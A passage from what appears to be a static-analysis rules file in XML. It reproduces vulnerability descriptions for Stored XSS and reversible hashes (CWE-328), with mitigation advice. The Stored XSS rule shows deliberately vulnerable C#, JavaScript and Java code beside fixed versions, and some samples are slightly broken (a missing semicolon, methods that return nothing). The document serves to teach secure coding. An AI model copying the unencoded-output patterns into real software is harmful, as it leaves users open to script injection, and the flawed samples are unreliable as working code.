Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Common Consequences,
Demonstrative Examples, Description, Likelihood of Exploit, Name,
Observed Examples, Other Notes, Potential Mitigations, References,
Relationship Notes, Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description,
Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-10-29&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Demonstrative Examples,
Maintenance Notes, Modes of Introduction, Observed Examples, Relationships,
Research Gaps, Terminology Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Demonstrative Examples,
Detection Factors&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Detection Factors, Potential Mitigations,
References, Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-04-05&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Insufficient Input
Validation&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_585</key><name>Heuristic_Stored_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use legitimate access to the application to submit engineered data to the application&amp;#8217;s database. When another user subsequently accesses this data, web pages may be rewritten and malicious scripts may be activated.&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from the application&amp;#8217;s database. The data is embedded directly in the page's HTML, causing the browser to display it as part of the web page. This data may have originated in input from another user. If the data includes HTML fragments or Javascript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary database data without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all dynamic data, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Validation is not a replacement for encoding. Fully encode all dynamic data, regardless of source, before embedding it in output. Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;Javascript encoding for server-generated Javascript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or its built-in functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is output to a label&lt;/h4&gt;&lt;pre&gt;public class StoredXss
{
        public string foo(Label lblOutput, SqlConnection connection, int id)
        {
                string sql = "select email from CustomerLogin where customerNumber = @id";
                SqlCommand cmd = new SqlCommand(sql, connection);
                cmd.Prepare();
                cmd.Parameters.AddWithValue("@id", id);
                string output = (string)cmd.ExecuteScalar();
                lblOutput.Text = String.IsNullOrEmpty(output) ? "Customer Number does not exist" : output;
        }
}&lt;/pre&gt;&lt;h4&gt;
The outputed string is Html encoded before it is displayed in the label
      &lt;/h4&gt;&lt;pre&gt;public class StoredXssFixed
{
        public string foo(Label lblOutput, SqlConnection connection, HttpServerUtility Server, int id)
        {
                string sql = "select email from CustomerLogin where customerNumber = @id";
                SqlCommand cmd = new SqlCommand(sql, connection);
                cmd.Prepare();
                cmd.Parameters.AddWithValue("@id", id);
                string output = (string)cmd.ExecuteScalar()
                lblOutput.Text = String.IsNullOrEmpty(output) ? "Customer Number does not exist" : Server.HtmlEncode(output);                
        }
}&lt;/pre&gt;&lt;h3&gt;JavaScript&lt;/h3&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is rendered to a web-page template&lt;/h4&gt;&lt;pre&gt;function renderUserProfileTable(res, connection, user_id) {
	connection.query('SELECT id,name,description from user WHERE id= ?', [user_id],function(err, results) {
		var table = "&lt;table&gt;"
		table += "&lt;table class='profile-html-table'&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + results[0].name + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + results[0].description + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;/table&gt;"
		res.render("profile", table)
	});
}&lt;/pre&gt;&lt;h4&gt;Data obtained from the execution of an SQL command is encoded and then rendered to a web-page template&lt;/h4&gt;&lt;pre&gt;var htmlencoder = require('htmlencode');

function renderUserProfileTable(res, connection, user_id) {
	connection.query('SELECT id,name,description from user WHERE id= ?', [user_id],function(err, results) {
		var table = "&lt;table&gt;"
		table += "&lt;table class='profile-html-table'&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + htmlencoder.htmlEncode(results[0].name) + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;tr&gt;&lt;td&gt;" + htmlencoder.htmlEncode(results[0].description) + "&lt;/td&gt;&lt;/tr&gt;"
		table += "&lt;/table&gt;"
		res.render("profile", table)
	});
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Data obtained from the excecution of an SQL command is output to a label&lt;/h4&gt;&lt;pre&gt;public class Stored_XSS {
	public static void XSSExample(Statement stmt) throws SQLException {
		Label label = new Label();
		ResultSet rs;
		rs = stmt.executeQuery("SELECT * FROM Customers WHERE UserName = Mickey");
		String lastNames = "";
		while (rs.next()) {
			lastNames += rs.getString("Lname") + ", ";
		}
		label.setText("Mickey last names are: " + lastNames + " ");
	}
}&lt;/pre&gt;&lt;h4&gt;The outputed string is encoded to hard-coded string before it is displayed in the label&lt;/h4&gt;&lt;pre&gt;public class Stored_XSS_Fix {
	public static void XSSExample(Statement stmt) throws SQLException {
		Label label = new Label();
		ResultSet rs;
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("A", "Cohen");
		sanitize.put("B", "Smith");
		sanitize.put("C", "Bond");
		rs = stmt.executeQuery("SELECT * FROM Customers WHERE UserName = Mickey");
		String lastNames = "";
		while (rs.next()) {
			lastNames += sanitize.get(rs.getString("Lname")) + ", ";
		}
		label.setText("Mickey last names are: " + lastNames + " ");
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1659</key><name>Reversible_One_Way_Hash</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Reversible One-Way Hash&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;328&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_328_Description" id="oc_328_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product uses a hashing algorithm that produces a hash value
that can be used to determine the original input, or to find an input that can
produce the same hash, more efficiently than brute force
techniques.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;This weakness is especially dangerous when the hash is used in security
algorithms that require the one-way property to hold. For example, if an
authentication system takes an incoming password and generates a hash, then
compares the hash to another hash that it has stored in its authentication
database, then the ability to create a collision could allow an attacker to
provide an alternate password that produces the same target hash, bypassing
authentication.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_328_Time of Introduction" id="oc_328_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_328_Applicable Platforms" id="oc_328_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_328_Observed Examples" id="oc_328_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4068" target="_blank"&gt;CVE-2006-4068&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Hard-coded hashed values for username and password
contained in client-side script, allowing brute-force offline
attacks.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_328_Potential Mitigations" id="oc_328_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use a hash algorithm that is currently considered to be strong by
experts in the field. MD-4 and MD-5 have known weaknesses. SHA-1 has
also been broken.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_328_Relationships" id="oc_328_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;310&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=310" target="_blank"&gt;Cryptographic Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;326&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=326" target="_blank"&gt;Inadequate Encryption Strength&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;327&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=327" target="_blank"&gt;Use of a Broken or Risky Cryptographic Algorithm&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_328_Taxonomy Mappings" id="oc_328_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Reversible One-Way Hash&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_328_Related Attack Patterns" id="oc_328_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org68.html" target="_blank"&gt;68&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Subvert Code-signing Facilities&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_328_References" id="oc_328_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Alexander Sotirov et al.. "MD5 considered harmful today". &amp;lt;&lt;a href="http://www.phreedom.org/research/rogue-ca/" target="_blank"&gt;http://www.phreedom.org/research/rogue-ca/&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_328_Content History" id="oc_328_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Observed Example,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, References&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-10-29&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1643</key><name>Improper_Resource_Locking</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Insufficient Resource Locking&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

